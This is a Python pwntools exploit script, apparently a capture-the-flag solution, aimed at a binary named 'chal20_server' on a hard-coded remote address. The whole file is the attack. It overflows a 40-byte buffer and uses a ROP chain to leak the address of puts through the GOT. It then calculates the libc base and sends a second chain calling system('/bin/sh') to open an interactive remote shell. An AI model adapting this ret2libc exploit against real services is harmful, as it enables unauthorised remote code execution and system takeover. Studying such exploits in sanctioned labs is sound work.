#!/usr/bin/python3

from pwn import *
from pprint import pprint
#chal = connect('103.157.96.13', 7789)

context.arch = 'amd64'

offset = 40
elf = ELF("./chal20_server")

##p = elf.process()
p = remote('103.157.96.13', 7789)

rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['get'])

print(p.recvuntil("Input: "))

payload = [
    b"A"*offset,
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.info(f"puts address at {hex(puts)}")

libc = ELF('libc_docker.so')
libc.address = puts - libc.symbols["puts"]
log.info(f"libc address at {hex(libc.address)}")

rop = ROP(libc)
rop.call(libc.symbols["puts"], [ next(libc.search(b"/bin/sh\x00")) ])
rop.call(libc.symbols["system"], [ next(libc.search(b"/bin/sh\x00")) ])
rop.call(libc.symbols["exit"])

payload = [
    b"A"*offset,
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)
p.interactive()
